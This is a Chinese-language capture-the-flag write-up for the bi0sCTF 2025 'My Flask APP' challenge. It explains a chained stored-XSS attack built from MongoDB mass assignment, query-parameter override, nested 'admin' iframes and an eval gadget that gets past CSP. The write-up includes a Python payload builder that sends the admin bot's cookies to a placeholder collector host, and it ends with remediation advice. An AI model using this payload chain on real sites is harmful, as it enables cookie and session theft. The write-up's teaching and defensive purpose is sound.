# bi0sCTF 2025：My Flask APP

## 题目简述

题目是一个 Flask、MongoDB 和 Playwright 组成的用户资料应用。普通用户可以注册并更新个人简介；管理员 Bot 登录后会把 flag 放进可由 JavaScript 读取的 `flag` Cookie，再访问 `/users?name=<被举报用户>`。目标是让 Bot 在同源页面中执行攻击者控制的 JavaScript并外带 Cookie。

这条利用链同时涉及四个缺陷：

1. `/update_bio` 只校验 `data["bio"]`，却把整个 JSON 对象交给 MongoDB 的 `$set`，因此可以写入任意额外字段；
2. `/api/users` 返回文档的全部非密码字段，`users.js` 又把每个键值对拼进 iframe 查询串；
3. `/render` 对 `bio` 使用 Jinja `safe`，把查询参数直接作为 HTML；
4. 同源脚本 `/static/users.js` 在 `window.name == "admin"` 时会 `eval(js)`，而 CSP 又允许 `'unsafe-eval'`。

仓库没有官方 exploit。本文依据当前源码和一份[公开成功解法](https://enoch.host/archives/bi0sctf-2025-wp)还原完整载荷；外部解法中的关键编码层、iframe 层级和执行路径均已写入正文。

## 解题过程

### 1. 利用批量字段更新写入恶意键

`update_bio()` 的校验对象与写入对象不一致：

```python
data = request.json
if "username" in data or "password" in data:
    return jsonify({"error": "Cannot update username or password"}), 400

bio = data.get("bio", "")
if not bio or any(
    char not in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 "
    for char in bio
):
    return jsonify({"error": "Invalid bio"}), 400

users_collection.update_one(
    {"username": username},
    {"$set": data},
)
```

只要 `bio` 本身是合法字母数字字符串，其他键和值就完全不受过滤。攻击时额外写入名为 `&bio` 的字段，并把多层 iframe 放在它的值中。

管理员查看用户时，`users.js` 对返回对象执行：

```javascript
Object.keys(user)
  .map((i) => encodeURI(i + "=" + user[i]).replaceAll("&", ""))
  .join("&")
```

这里的细节决定了为什么键要叫 `&bio`：`encodeURI` 不编码 `&`，后面的 `replaceAll` 会删掉键开头的 `&`，于是该分量从 `&bio=<payload>` 变成 `bio=<payload>`。Flask JSON 输出对键排序后，`&bio` 位于正常 `bio` 之前；各分量再由 `join("&")` 连接，最终 `/render` 收到两个同名参数，而 `request.args.get("bio")` 取第一个恶意值。

### 2. 用两层 iframe完成重复 URL 解码

`render.html` 中的危险点是：

```html
<p id="bio">{{ request.args.get('bio') |safe }}</p>
```

但直接插入内联脚本会被 CSP 拦截。应用自己的 `/static/users.js` 是允许加载的同源脚本，其中又有以下 gadget：

```javascript
if (window.name == "admin") {
  js = urlParams.get("js");
  if (js) {
    eval(js);
  }
}
```

主版本的 `render.html` 不加载会执行 `window.name = "notadmin"` 的 `index.js`，所以只要创建 `<iframe name="admin">`，该子页面中的 `window.name` 就能保持为 `admin`。

还需要解决一个编码问题：内层页面必须同时收到 `bio=<script ...>` 和独立的 `js=<代码>` 参数。如果一开始就把 `&js=` 放进 iframe URL，它会先被 `encodeURI` 编码，抵达最终页面时仍只是 `bio` 的一部分。多套一层 `/render?bio=...`，让每次请求各完成一次百分号解码，第二层输出的 iframe URL 中才会出现真正的 `&js=` 查询分隔符。

下面的构造器把三层页面关系写清楚，并生成可直接提交给 `/update_bio` 的 JSON。`COLLECTOR` 应替换为自己的 HTTPS 接收端：

```python
from urllib.parse import quote

collector = "https://COLLECTOR.example/"
javascript = (
    "top.location="
    + repr(collector + "?c=")
    + "+encodeURIComponent(document.cookie)"
)

# 最内层 /render：加载同源 users.js，并让它从独立 js 参数取代码。
script_html = '<script src="/static/users.js"></script>'
inner_src = (
    "/render?bio="
    + quote(script_html, safe="")
    + "&js="
    + quote(javascript, safe="")
)
inner_frame = f'<iframe name="admin" src="{inner_src}"></iframe>'

# 中间层先把 inner_frame 解码成 HTML；浏览器随后请求 inner_src。
outer_src = "/render?bio=" + quote(inner_frame, safe="")
outer_frame = f'<iframe name="admin" src="{outer_src}"></iframe>'

update_body = {
    "&bio": outer_frame,
    "bio": "abenign",
}
print(update_body)
```

执行顺序如下：

1. 注册一个只含字母数字的普通用户名；注册成功后服务端已经建立登录 Session；
2. 向 `/update_bio` POST 上述 `update_body`；
3. 向 `/report` POST `{"name":"<用户名>"}`；
4. Bot 登录管理员账号、设置 `flag` Cookie并访问 `/users?name=<用户名>`；
5. 用户列表脚本把恶意 `&bio` 字段转成第一个 `bio` 参数，`render.html` 依次生成两层命名为 `admin` 的 iframe；
6. 最内层加载 `/static/users.js`，通过 `window.name` 检查后执行 `js` 参数；
7. `top.location` 把 Bot 顶层页面导航到接收端，查询参数中带有 `document.cookie`。

使用顶层导航而不是 `fetch`，可以避开当前 CSP 中 `default-src 'self'` 对跨域连接的限制。Bot 设置 Cookie 时明确使用了 `httpOnly: False`，所以最内层同源页面能够读取它。

仓库 `Dockerfile` 中的 flag 为：

```text
bi0sCTF{i_d0n't_f1nd_bugs!!_bug5_f1nd_m3:)}
```

本次没有启动 MongoDB、Playwright 和回连服务进行动态重放；成功载荷来自公开比赛解法，字段写入、排序后的参数覆盖、`window.name`、同源脚本和 Cookie 属性均由当前源码逐项核对。另用与代码片段相同的编码规则在本地逐层展开查询串，确认中间层恢复第二个 iframe、最内层分别得到 `<script src="/static/users.js"></script>` 和完整 `js` 参数。

## 方法总结

这题的决定性障碍不是单独的存储型 XSS，而是跨越数据库、JSON 序列化、URL 生成、模板渲染和浏览器上下文的多阶段数据流。额外字段 `&bio` 先借助批量更新进入 MongoDB，再利用键排序和错误的 `replaceAll` 变成优先级更高的 `bio` 参数；两层 iframe 消化多余的百分号编码；最后借 `window.name` 和应用自身的 `eval` gadget 绕过禁止内联脚本的 CSP。

修复时需要同时收紧各层：更新接口只允许固定字段并检查类型；序列化 URL 应使用 `URLSearchParams`，不能拼字符串；模板不得对用户输入使用 `safe`；删除查询参数驱动的 `eval`；CSP 也不应保留 `'unsafe-eval'`。只修其中一层会降低利用稳定性，却不一定消除整条链。
